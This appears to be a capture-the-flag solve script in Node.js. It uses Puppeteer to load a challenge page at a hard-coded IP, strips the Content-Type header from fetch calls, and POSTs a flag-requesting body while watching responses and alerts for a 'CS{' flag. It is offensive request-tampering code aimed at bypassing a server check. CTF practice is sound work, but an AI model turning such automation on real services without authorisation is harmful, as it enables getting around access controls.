const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({ headless: true });
  const page = await browser.newPage();
  
  // Monitor network activity
  page.on('response', async response => {
    if (response.url().includes('6969') && response.request().method() === 'POST') {
      const text = await response.text();
      console.log('Response:', text);
      if (text.includes('CS{')) {
        console.log('*** FLAG FOUND ***');
      }
    }
  });
  
  page.on('dialog', async dialog => {
    const message = dialog.message();
    console.log('Alert:', message);
    if (message.includes('CS{')) {
      console.log('*** FLAG IN ALERT ***');
    }
    await dialog.accept();
  });
  
  try {
    await page.goto('http://49.213.52.6:6969/');
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Try to modify the fetch to not include Content-Type
    await page.evaluate(() => {
      const originalFetch = window.fetch;
      window.fetch = function(url, options = {}) {
        // Remove Content-Type if it exists
        if (options.headers) {
          delete options.headers['Content-Type'];
          delete options.headers['content-type'];
        }
        return originalFetch(url, options);
      };
    });
    
    // Click the button
    await page.click('#button');
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Also try direct fetch without Content-Type
    const result = await page.evaluate(async () => {
      const res = await fetch('/', {
        method: 'POST',
        body: JSON.stringify({ flagDaw: true }),
      });
      return await res.text();
    });
    console.log('Direct fetch result:', result);
    
  } catch (error) {
    console.error('Error:', error);
  } finally {
    await browser.close();
  }
})();

